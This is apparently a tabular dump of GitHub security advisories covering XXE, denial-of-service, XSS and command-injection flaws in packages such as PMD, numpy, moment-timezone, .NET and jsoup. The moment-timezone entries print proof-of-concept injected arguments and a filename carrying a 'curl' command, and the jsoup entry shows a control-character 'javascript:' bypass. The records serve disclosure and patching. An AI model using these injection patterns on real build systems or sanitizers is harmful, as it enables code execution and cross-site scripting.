If you have any questions or comments about this advisory, or need assistance deploying a fix, email us at [security@openzeppelin.com](mailto:security@openzeppelin.com).",npm
2981,38260,net.sourceforge.pmd:pmd-core,GHSA-57qj-79gh-69w8,CVE-2019-7722,https://github.com/advisories/GHSA-57qj-79gh-69w8,high,2022-05-14 01:33:06 UTC,Improper Restriction of XML External Entity Reference in PMD,"PMD 5.8.1 and earlier processes XML external entities in ruleset files it parses as part of the analysis process, allowing attackers tampering it (either by direct modification or MITM attacks when using remote rulesets) to perform information disclosure, denial of service, or request forgery attacks. (PMD 6.x is unaffected because of a 2017-09-15 change.)",maven
2982,19828,numpy,GHSA-2fc2-6r4j-p65h,CVE-2014-1859,https://github.com/advisories/GHSA-2fc2-6r4j-p65h,moderate,2022-05-14 01:08:34 UTC,Numpy arbitrary file write via symlink attack,"(1) core/tests/test_memmap.py, (2) core/tests/test_multiarray.py, (3) f2py/f2py2e.py, and (4) lib/tests/test_io.py in NumPy before 1.8.1 allow local users to write to arbitrary files via a symlink attack on a temporary file.",pip
2983,34041,org.elasticsearch:elasticsearch,GHSA-r9fv-qpm9-rj4g,CVE-2018-3831,https://github.com/advisories/GHSA-r9fv-qpm9-rj4g,high,2022-05-13 01:27:27 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Elasticsearch,"Elasticsearch Alerting and Monitoring in versions before 6.4.1 or 5.6.12 have an information disclosure issue when secrets are configured via the API. The Elasticsearch _cluster/settings API, when queried, could leak sensitive configuration information such as passwords, tokens, or usernames. This could allow an authenticated Elasticsearch user to improperly view these details.",maven
2984,34676,org.jboss.resteasy:resteasy-client,GHSA-g4jg-gpwv-p7wv,CVE-2011-5245,https://github.com/advisories/GHSA-g4jg-gpwv-p7wv,moderate,2022-05-17 01:50:09 UTC,Exposure of Sensitive Information to an Unauthorized Actor in RESTEasy,"The readFrom function in providers.jaxb.JAXBXmlTypeProvider in RESTEasy before 2.3.2 allows remote attackers to read arbitrary files via an external entity reference in a Java Architecture for XML Binding (JAXB) input, aka an XML external entity (XXE) injection attack, a similar vulnerability to CVE-2012-0818.",maven
2985,34081,org.apache.poi:poi,GHSA-jqx5-h2hw-5q4f,CVE-2012-0213,https://github.com/advisories/GHSA-jqx5-h2hw-5q4f,moderate,2022-05-04 00:28:50 UTC,Denial of Service in Apache POI,The UnhandledDataStructure function in hwpf/model/UnhandledDataStructure.java in Apache POI 3.8 and earlier allows remote attackers to cause a denial of service (OutOfMemoryError exception and possibly JVM destabilization) via a crafted length value in a Channel Definition Format (CDF) or Compound File Binary Format (CFBF) document.,maven
2986,34125,org.apache.hadoop:hadoop-client,GHSA-q46v-cj5v-hvg6,CVE-2012-4449,https://github.com/advisories/GHSA-q46v-cj5v-hvg6,critical,2022-05-17 00:22:31 UTC,Use of a Broken or Risky Cryptographic Algorithm in Apache Hadoop,"Apache Hadoop before 0.23.4, 1.x before 1.0.4, and 2.x before 2.0.2 generate token passwords using a 20-bit secret when Kerberos security features are enabled, which makes it easier for context-dependent attackers to crack secret keys via a brute-force attack.",maven
2987,34081,org.apache.poi:poi,GHSA-5wfp-8643-c58x,CVE-2014-3574,https://github.com/advisories/GHSA-5wfp-8643-c58x,moderate,2022-05-17 01:24:36 UTC,Improper Input Validation in Apache POI,"Apache POI before 3.10.1 and 3.11.x before 3.11-beta2 allows remote attackers to cause a denial of service (CPU consumption and crash) via a crafted OOXML file, aka an XML Entity Expansion (XEE) attack.",maven
2988,34422,org.apache.shiro:shiro-core,GHSA-p836-389h-j692,CVE-2016-4437,https://github.com/advisories/GHSA-p836-389h-j692,high,2022-05-14 02:46:17 UTC,Improper Access Control in Apache Shiro,"Apache Shiro before 1.2.5, when a cipher key has not been configured for the ""remember me"" feature, allows remote attackers to execute arbitrary code or bypass intended access restrictions via an unspecified request parameter.",maven
2989,35045,org.apache.activemq:activemq-client,GHSA-w525-w93j-rxgm,CVE-2016-0734,https://github.com/advisories/GHSA-w525-w93j-rxgm,moderate,2022-05-14 01:14:51 UTC,Improper Neutralization of Input During Web Page Generation in Apache ActiveMQ,"The web-based administration console in Apache ActiveMQ 5.x before 5.13.2 does not send an X-Frame-Options HTTP header, which makes it easier for remote attackers to conduct clickjacking attacks via a crafted web page that contains a (1) FRAME or (2) IFRAME element.",maven
2990,35696,org.apache.ws.security:wss4j,GHSA-vjwc-5hfh-2vv5,CVE-2015-0226,https://github.com/advisories/GHSA-vjwc-5hfh-2vv5,high,2022-05-14 00:55:57 UTC,Use of a Broken or Risky Cryptographic Algorithm in Apache WSS4J,"Apache WSS4J before 1.6.17 and 2.0.x before 2.0.2 improperly leaks information about decryption failures when decrypting an encrypted key or message data, which makes it easier for remote attackers to recover the plaintext form of a symmetric key via a series of crafted messages. NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-2487.",maven
2991,34807,org.apache.santuario:xmlsec,GHSA-r237-w2w6-jq3p,CVE-2013-2172,https://github.com/advisories/GHSA-r237-w2w6-jq3p,moderate,2022-05-13 01:05:56 UTC,Inefficient Algorithmic Complexity in Apache Santuario XML Security,"jcp/xml/dsig/internal/dom/DOMCanonicalizationMethod.java in Apache Santuario XML Security for Java 1.4.x before 1.4.8 and 1.5.x before 1.5.5 allows context-dependent attackers to spoof an XML Signature by using the CanonicalizationMethod parameter to specify an arbitrary weak ""canonicalization algorithm to apply to the SignedInfo part of the Signature.""",maven
2992,28938,python-docx,GHSA-34wj-p5jm-2p96,CVE-2016-5851,https://github.com/advisories/GHSA-34wj-p5jm-2p96,high,2022-05-13 01:06:10 UTC,Improper Restriction of XML External Entity Reference in python-docx,python-docx before 0.8.6 allows context-dependent attackers to conduct XML External Entity (XXE) attacks via a crafted document.,pip
2993,35045,org.apache.activemq:activemq-client,GHSA-3v63-f83x-37x4,CVE-2015-1830,https://github.com/advisories/GHSA-3v63-f83x-37x4,moderate,2022-05-14 01:14:51 UTC,Improper Limitation of a Pathname to a Restricted Directory in Apache ActiveMQ,Directory traversal vulnerability in the fileserver upload/download functionality for blob messages in Apache ActiveMQ 5.x before 5.11.2 for Windows allows remote attackers to create JSP files in arbitrary directories via unspecified vectors.,maven
2994,34977,org.infinispan:infinispan-core,GHSA-46r5-59fg-2fjc,CVE-2017-15089,https://github.com/advisories/GHSA-46r5-59fg-2fjc,high,2022-05-14 00:59:30 UTC,Deserialization of Untrusted Data in Infinispan,"It was found that the Hotrod client in Infinispan before 9.2.0.CR1 would unsafely read deserialized data on information from the cache. An authenticated attacker could inject a malicious object into the data cache and attain deserialization on the client, and possibly conduct further attacks.",maven
2995,34497,io.undertow:undertow-core,GHSA-95rf-557x-44g5,CVE-2022-2053,https://github.com/advisories/GHSA-95rf-557x-44g5,high,2022-08-06 00:00:46 UTC,Undertow vulnerable to Dos via Large AJP request,"When a POST request comes through AJP and the request exceeds the max-post-size limit (maxEntitySize), Undertow's AjpServerRequestConduit implementation closes a connection without sending any response to the client/proxy. This behavior results in that a front-end proxy marking the backend worker (application server) as an error state and not forward requests to the worker for a while. In mod_cluster, this continues until the next STATUS request (10 seconds intervals) from the application server updates the server state. So, in the worst case, it can result in ""All workers are in error state"" and mod_cluster responds ""503 Service Unavailable"" for a while (up to 10 seconds). In mod_proxy_balancer, it does not forward requests to the worker until the ""retry"" timeout passes. However, luckily, mod_proxy_balancer has ""forcerecovery"" setting (On by default; this parameter can force the immediate recovery of all workers without considering the retry parameter of the workers if all workers of a balancer are in error state.). So, unlike mod_cluster, mod_proxy_balancer does not result in responding ""503 Service Unavailable"". An attacker could use this behavior to send a malicious request and trigger server errors, resulting in DoS (denial of service). This flaw was fixed in Undertow 2.2.19.Final, Undertow 2.3.0.Alpha2.",maven
2996,13005,Microsoft.AspNetCore.App,GHSA-hxrm-9w7p-39cc,CVE-2020-1045,https://github.com/advisories/GHSA-hxrm-9w7p-39cc,high,2022-05-24 17:27:57 UTC,Cookie parsing failure,"A security feature bypass vulnerability exists in the way Microsoft ASP.NET Core parses encoded cookie names.The ASP.NET Core cookie parser decodes entire cookie strings which could allow a malicious attacker to set a second cookie with the name being percent encoded.The security update addresses the vulnerability by fixing the way the ASP.NET Core cookie parser handles encoded names., aka 'Microsoft ASP.NET Core Security Feature Bypass Vulnerability'.",nuget
2997,30546,opcua,GHSA-mfpj-3qhm-976m,CVE-2022-25304,https://github.com/advisories/GHSA-mfpj-3qhm-976m,high,2022-08-24 00:00:31 UTC,Uncontrolled Resource Consumption in asyncua and opcua,All versions of package opcua; all versions of package asyncua are vulnerable to Denial of Service (DoS) due to a missing limitation on the number of received chunks - per single session or in total for all concurrent sessions. An attacker can exploit this vulnerability by sending an unlimited number of huge chunks (e.g. 2GB each) without sending the Final closing chunk.,pip
2998,35577,org.apache.activemq:artemis-server,GHSA-cv6r-h2fm-pvrp,CVE-2022-35278,https://github.com/advisories/GHSA-cv6r-h2fm-pvrp,moderate,2022-08-24 00:00:29 UTC,HTML Injection in ActiveMQ Artemis Web Console,"In Apache ActiveMQ Artemis prior to 2.24.0, an attacker could show malicious content and/or redirect users to a malicious URL in the web console by using HTML in the name of an address or queue.",maven
2999,16863,next,GHSA-wff4-fpwg-qqv3,CVE-2022-36046,https://github.com/advisories/GHSA-wff4-fpwg-qqv3,moderate,2022-08-30 20:38:34 UTC,Unexpected server crash in Next.js,"### Impact

When specific requests are made to the Next.js server it can cause an `unhandledRejection` in the server which can crash the process to exit in specific Node.js versions with strict `unhandledRejection` handling. 

- Affected: All of the following must be true to be affected by this CVE
  - Node.js version above v15.0.0 being used with strict `unhandledRejection` exiting
  - Next.js version v12.2.3
  - Using next start or a [custom server](https://nextjs.org/docs/advanced-features/custom-server)
 
- Not affected: Deployments on Vercel ([vercel.com](https://vercel.com/)) are not affected along with similar environments where `next-server` isn't being shared across requests.

### Patches
https://github.com/vercel/next.js/releases/tag/v12.2.4
",npm
3000,16298,moment-timezone,GHSA-56x4-j7p9-fcf9,,https://github.com/advisories/GHSA-56x4-j7p9-fcf9,low,2022-08-30 20:31:21 UTC,Command Injection in moment-timezone,"### Impact

All versions of moment-timezone from 0.1.0 contain build tasks vulnerable to command injection.

* if Alice uses tzdata pipeline to package moment-timezone on her own (for example via `grunt data:2014d`, where `2014d` stands for the version of the tzdata to be used from IANA's website),
* and Alice let's Mallory select the version (`2014d` in our example), then Mallory can execute arbitrary commands on the machine running the grunt task, with the same privilege as the grunt task

#### Am I affected?

##### Do you build custom versions of moment-timezone with grunt?

If no, you're not affected.

##### Do you allow a third party to specify which particular version you want build?

If yes, you're vulnerable to command injection -- third party may execute arbitrary commands on the system running grunt task with the same privileges as grunt task.

### Description

#### Command Injection via grunt-zdownload.js and MITM on iana's ftp endpoint

The `tasks/data-download.js` script takes in a parameter from grunt and uses it to form a command line which is then executed:

```
6  module.exports = function (grunt) {
7      grunt.registerTask('data-download', '1. Download data from iana.org/time-zones.', function (version) {
8          version = version || 'latest';

10          var done  = this.async(),
11              src   = 'ftp://ftp.iana.org/tz/tzdata-latest.tar.gz',
12              curl  = path.resolve('temp/curl', version, 'data.tar.gz'),
13              dest  = path.resolve('temp/download', version);
...
24          exec('curl ' + src + ' -o ' + curl + ' && cd ' + dest + ' && gzip -dc ' + curl + ' | tar -xf -', function (err) {
```

Ordinarily, one one run this script using something like `grunt data-download:2014d`, in which case version would have the value `2014d`. However, if an attacker were to provide additional content on the command line, they would be able to execute arbitrary code

```
root@e94ba0490b65:/usr/src/app/moment-timezone# grunt 'data-download:2014d ; echo flag>/tmp/foo #'
\Running ""data-download:2014d ; echo flag>/tmp/foo #"" (data-download) task
>> Downloading https://data.iana.org/time-zones/releases/tzdata2014d ; echo flag>/tmp/foo #.tar.gz
>> Downloaded https://data.iana.org/time-zones/releases/tzdata2014d ; echo flag>/tmp/foo #.tar.gz

Done.
root@e94ba0490b65:/usr/src/app/moment-timezone# cat /tmp/foo
flag
```

#### Command Injection via data-zdump.js

The `tasks/data-zdump.js` script reads a list of files present in a temporary directory (created by previous tasks), and for each one, assembles and executes a command line without sanitization. As a result, an attacker able to influence the contents of that directory could gain code execution. This attack is exacerbated by timezone data being downloaded via cleartext FTP (described above), but beyond that, an attacker at iana.org able to modify the timezone files could disrupt any systems that build moment-timezone.

```
15              files     = grunt.file.expand({ filter : 'isFile', cwd : 'temp/zic/' + version }, '**/*');
...
27          function next () {
...
33              var file = files.pop(),
34                  src  = path.join(zicBase, file),
35                  dest = path.join(zdumpBase, file);
36              exec('zdump -v ' + src, { maxBuffer: 20*1024*1024 }, function (err, stdout) {
```

In this case, an attacker able to add a file to `temp/zic/2014d` (for example) with a filename like `Z; curl www.example.com` would influence the called to exec on line 36 and run arbitrary code. There are a few minor challenges in exploiting this, since the string needs to be a valid filename.

#### Command Injection via data-zic.js

Similar to the vulnerability in /tasks/data-download.js, the /tasks/data-zic.js script takes a version from the command line and uses it as part of a command line, executed without sanitization.

```
10          var done  = this.async(),
11              dest  = path.resolve('temp/zic', version),
...
22              var file = files.shift(),
23                  src = path.resolve('temp/download', version, file);
24
25              exec('zic -d ' + dest + ' ' + src, function (err) {
```

As a result, an attacker able to influence that string can run arbitrary commands. Of course, it requires an attacker able to influence the command passed to grunt, so may be unlikely in practice.

```
root@e94ba0490b65:/usr/src/app/moment-timezone# grunt 'data-zic:2014d; echo hi > /tmp/evil; echo '
Running ""data-zic:2014d; echo hi > /tmp/evil; echo "" (data-zic) task
exec: zid -d /usr/src/app/moment-timezone/temp/zic/2014d; echo hi > /tmp/evil; echo  /usr/src/app/moment-timezone/temp/download/2014d; echo hi > /tmp/evil; echo /africa
...

root@e94ba0490b65:/usr/src/app/moment-timezone# cat /tmp/evil
hi
```

### Patches

The supplied patch on top of 0.5.34 is applicable with minor tweaks to all affected versions. It switches `exec` to `execFile` so arbitrary bash fragments won't be executed any more.

### References

* https://knowledge-base.secureflag.com/vulnerabilities/code_injection/os_command_injection_nodejs.html
* https://auth0.com/blog/preventing-command-injection-attacks-in-node-js-apps/",npm
3001,16298,moment-timezone,GHSA-v78c-4p63-2j6c,,https://github.com/advisories/GHSA-v78c-4p63-2j6c,moderate,2022-08-30 20:28:43 UTC,Cleartext Transmission of Sensitive Information in moment-timezone,"### Impact

* if Alice uses `grunt data` (or `grunt release`) to prepare a custom-build, moment-timezone with the latest tzdata from IANA's website
* and Mallory intercepts the request to IANA's unencrypted ftp server, Mallory can serve data which might exploit further stages of the moment-timezone tzdata pipeline, or potentially produce a tainted version of moment-timezone (practicality of such attacks is not proved)

### Patches
Problem has been patched in version 0.5.35, patch should be applicable with minor modifications to all affected versions. The patch includes changing the FTP endpoint with an HTTPS endpoint.

### Workarounds
Specify the exact version of tzdata (like `2014d`, full command being `grunt data:2014d`, then run the rest of the release tasks by hand), or just apply the patch before issuing the grunt command.
",npm
3002,12889,Microsoft.Owin,GHSA-3rq8-h3gj-r5c6,CVE-2022-29117,https://github.com/advisories/GHSA-3rq8-h3gj-r5c6,high,2022-08-30 19:32:29 UTC,.NET Denial of Service Vulnerability,"Microsoft is releasing this security advisory to provide information about a vulnerability in .NET 6.0, .NET 5.0 and .NET Core 3.1. This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.

A vulnerability exists in .NET 6.0, .NET 5.0 and .NET core 3.1 where a malicious client can manipulate cookies and cause a Denial of Service.

### Affected software

* Any .NET 6.0 application running on .NET 6.0.4 or earlier.
* Any .NET 5.0 application running .NET 5.0.16 or earlier.
* Any .NET Core 3.1 application running on .NET Core 3.1.24 or earlier.

#### Affected packages

**.NET Core 3.1**

| Package name                                 | Affected versions | Patched versions |
|---------------------------------------------------|-------------------|------------------|
| Microsoft.Owin.Security.Cookies                   | <4.2.2            | 4.2.2             |
| Microsoft.Owin.Security                           | <4.2.2            | 4.2.2             |
| Microsoft.AspNetCore.App.Runtime.win-x64          | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.linux-x64        | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.win-x86          | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.osx-x64          | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.linux-musl-x64   | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.linux-arm64      | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.linux-arm        | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.win-arm64        | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.win-arm          | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.linux-musl-arm64 | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.linux-musl-arm   | >=3.0.0,3.1.24    | 3.1.25           |

**.NET 5.0**

| Affected packages                                 | Affected versions | Patched versions |
|---------------------------------------------------|-------------------|------------------|
| Microsoft.Owin.Security.Cookies                   | < 4.2.2            | 4.2.2             |
| Microsoft.AspNetCore.App.Runtime.win-x64          | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.linux-x64        | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.win-x86          | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.osx-x64          | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.linux-musl-x64   | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.linux-arm64      | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.linux-arm        | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.win-arm64        | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.win-arm          | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.linux-musl-arm64 | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.linux-musl-arm   | >=5.0.0,5.0.16    | 5.0.17           |

**.NET 6.0**

| Affected packages                                 | Affected versions | Patched versions |
|---------------------------------------------------|-------------------|------------------|
| Microsoft.Owin.Security.Cookies                   | <4.2.2            | 4.2.2             |
| Microsoft.AspNetCore.App.Runtime.win-x64          | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.linux-x64        | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.win-x86          | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.osx-x64          | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.linux-musl-x64   | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.linux-arm64      | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.linux-arm        | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.win-arm64        | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.win-arm          | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.osx-arm64        | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.linux-musl-arm64 | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.linux-musl-arm   | >=6.0.0,6.0.4     | 6.0.5            |


### Patches

* If you're using .NET Core 6.0, you should download and install Runtime 6.0.5 or SDK 6.0.105 (for Visual Studio 2022 v17.0) or SDK 6.0.203 (for Visual Studio 2022 v17.1) from https://dotnet.microsoft.com/download/dotnet-core/6.0.

* If you're using .NET 5.0, you should download and install Runtime 5.0.17 or SDK 5.0.214 (for Visual Studio 2019 v16.9) or SDK 5.0.408 (for Visual Studio 2011 v16.11) from https://dotnet.microsoft.com/download/dotnet-core/5.0.

* If you're using .NET Core 3.1, you should download and install Runtime 3.1.25 or SDK 3.1.419 (for Visual Studio 2019 v16.9 or Visual Studio 2011 16.11 or Visual Studio 2022 17.0 or Visual Studio 2022 17.1 ) from https://dotnet.microsoft.com/download/dotnet-core/3.1.

.NET 6.0, .NET 5.0 and .NET Core 3.1 updates are also available from Microsoft Update. To access this either type ""Check for updates"" in your Windows search, or open Settings, choose Update & Security and then click Check for Updates.

#### Other Details

- Announcement for this issue can be found at https://github.com/dotnet/announcements/issues/220
- An Issue for this can be found at https://github.com/dotnet/aspnetcore/issues/41608
- MSRC details for this can be found at https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-29117
",nuget
3003,12999,Microsoft.Owin.Security.Cookies,GHSA-3rq8-h3gj-r5c6,CVE-2022-29117,https://github.com/advisories/GHSA-3rq8-h3gj-r5c6,high,2022-08-30 19:32:29 UTC,.NET Denial of Service Vulnerability,"Microsoft is releasing this security advisory to provide information about a vulnerability in .NET 6.0, .NET 5.0 and .NET Core 3.1. This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.

A vulnerability exists in .NET 6.0, .NET 5.0 and .NET core 3.1 where a malicious client can manipulate cookies and cause a Denial of Service.

### Affected software

* Any .NET 6.0 application running on .NET 6.0.4 or earlier.
* Any .NET 5.0 application running .NET 5.0.16 or earlier.
* Any .NET Core 3.1 application running on .NET Core 3.1.24 or earlier.

#### Affected packages

**.NET Core 3.1**

| Package name                                 | Affected versions | Patched versions |
|---------------------------------------------------|-------------------|------------------|
| Microsoft.Owin.Security.Cookies                   | <4.2.2            | 4.2.2             |
| Microsoft.Owin.Security                           | <4.2.2            | 4.2.2             |
| Microsoft.AspNetCore.App.Runtime.win-x64          | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.linux-x64        | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.win-x86          | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.osx-x64          | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.linux-musl-x64   | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.linux-arm64      | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.linux-arm        | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.win-arm64        | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.win-arm          | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.linux-musl-arm64 | >=3.0.0,3.1.24    | 3.1.25           |
| Microsoft.AspNetCore.App.Runtime.linux-musl-arm   | >=3.0.0,3.1.24    | 3.1.25           |

**.NET 5.0**

| Affected packages                                 | Affected versions | Patched versions |
|---------------------------------------------------|-------------------|------------------|
| Microsoft.Owin.Security.Cookies                   | < 4.2.2            | 4.2.2             |
| Microsoft.AspNetCore.App.Runtime.win-x64          | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.linux-x64        | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.win-x86          | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.osx-x64          | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.linux-musl-x64   | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.linux-arm64      | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.linux-arm        | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.win-arm64        | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.win-arm          | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.linux-musl-arm64 | >=5.0.0,5.0.16    | 5.0.17           |
| Microsoft.AspNetCore.App.Runtime.linux-musl-arm   | >=5.0.0,5.0.16    | 5.0.17           |

**.NET 6.0**

| Affected packages                                 | Affected versions | Patched versions |
|---------------------------------------------------|-------------------|------------------|
| Microsoft.Owin.Security.Cookies                   | <4.2.2            | 4.2.2             |
| Microsoft.AspNetCore.App.Runtime.win-x64          | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.linux-x64        | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.win-x86          | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.osx-x64          | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.linux-musl-x64   | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.linux-arm64      | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.linux-arm        | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.win-arm64        | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.win-arm          | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.osx-arm64        | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.linux-musl-arm64 | >=6.0.0,6.0.4     | 6.0.5            |
| Microsoft.AspNetCore.App.Runtime.linux-musl-arm   | >=6.0.0,6.0.4     | 6.0.5            |


### Patches

* If you're using .NET Core 6.0, you should download and install Runtime 6.0.5 or SDK 6.0.105 (for Visual Studio 2022 v17.0) or SDK 6.0.203 (for Visual Studio 2022 v17.1) from https://dotnet.microsoft.com/download/dotnet-core/6.0.

* If you're using .NET 5.0, you should download and install Runtime 5.0.17 or SDK 5.0.214 (for Visual Studio 2019 v16.9) or SDK 5.0.408 (for Visual Studio 2011 v16.11) from https://dotnet.microsoft.com/download/dotnet-core/5.0.

* If you're using .NET Core 3.1, you should download and install Runtime 3.1.25 or SDK 3.1.419 (for Visual Studio 2019 v16.9 or Visual Studio 2011 16.11 or Visual Studio 2022 17.0 or Visual Studio 2022 17.1 ) from https://dotnet.microsoft.com/download/dotnet-core/3.1.

.NET 6.0, .NET 5.0 and .NET Core 3.1 updates are also available from Microsoft Update. To access this either type ""Check for updates"" in your Windows search, or open Settings, choose Update & Security and then click Check for Updates.

#### Other Details

- Announcement for this issue can be found at https://github.com/dotnet/announcements/issues/220
- An Issue for this can be found at https://github.com/dotnet/aspnetcore/issues/41608
- MSRC details for this can be found at https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-29117
",nuget
3004,18914,omniauth,GHSA-pm55-qfxr-h247,CVE-2020-36599,https://github.com/advisories/GHSA-pm55-qfxr-h247,critical,2022-08-19 00:00:16 UTC,OmniAuth's `lib/omniauth/failure_endpoint.rb` does not escape `message_key` value,lib/omniauth/failure_endpoint.rb in OmniAuth before 1.9.2 (and before 2.0) does not escape the message_key value.,rubygems
3005,35578,org.apache.activemq:artemis-core-client,GHSA-gf8c-j759-86mg,CVE-2021-4040,https://github.com/advisories/GHSA-gf8c-j759-86mg,moderate,2022-08-25 00:00:27 UTC,org.apache.activemq:artemis-core-client Vulnerable to Out-of-Bounds Write,A flaw was found in AMQ Broker. This issue can cause a partial interruption to the availability of AMQ Broker via an Out of memory (OOM) condition. This flaw allows an attacker to partially disrupt availability to the broker through a sustained attack of maliciously crafted messages. The highest threat from this vulnerability is system availability.,maven
3006,34012,org.jsoup:jsoup,GHSA-gp7f-rwcx-9369,CVE-2022-36033,https://github.com/advisories/GHSA-gp7f-rwcx-9369,moderate,2022-09-01 22:14:57 UTC,jsoup may not sanitize code injection XSS attempts if SafeList.preserveRelativeLinks is enabled,"jsoup may incorrectly sanitize HTML including `javascript:` URL expressions, which could allow cross-site scripting (XSS) attacks when a reader subsequently clicks that link. If the non-default `SafeList.preserveRelativeLinks` option is enabled, HTML including `javascript:` URLs that have been crafted with control characters will not be sanitized. If the site that this HTML is published on does not set a Content Security Policy, an XSS attack is then possible.

### Impact
Sites that accept input HTML from users and use jsoup to sanitize that HTML, may be vulnerable to cross-site scripting (XSS) attacks, if they have enabled `SafeList.preserveRelativeLinks` and do not set an appropriate Content Security Policy.

### Patches
This issue is patched in jsoup 1.15.3.

Users should upgrade to this version. Additionally, as the unsanitized input may have been persisted, old content should be cleaned again using the updated version.

### Workarounds
To remediate this issue without immediately upgrading:

- disable `SafeList.preserveRelativeLinks`, which will rewrite input URLs as absolute URLs
- ensure an appropriate [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) is defined. (This should be used regardless of upgrading, as a defence-in-depth best practice.)

### Background and root cause
jsoup includes a [Cleaner](https://jsoup.org/apidocs/org/jsoup/safety/Cleaner.html) component, which is designed to [sanitize input HTML](https://jsoup.org/cookbook/cleaning-html/safelist-sanitizer) against configurable safe-lists of acceptable tags, attributes, and attribute values.

This includes removing potentially malicious attributes such as `<a href=""javascript:..."">`, which may enable XSS attacks. It does this by validating URL attributes against allowed URL protocols (e.g. `http`, `https`).

However, an attacker may be able to bypass this check by embedding control characters into the href attribute value. This causes the Java URL class, which is used to resolve relative URLs to absolute URLs before checking the URL's protocol, to treat the URL as a relative URL. It is then resolved into an absolute URL with the configured base URI.

For example, `java\tscript:...` would resolve to `https://example.com/java\tscript:...`.

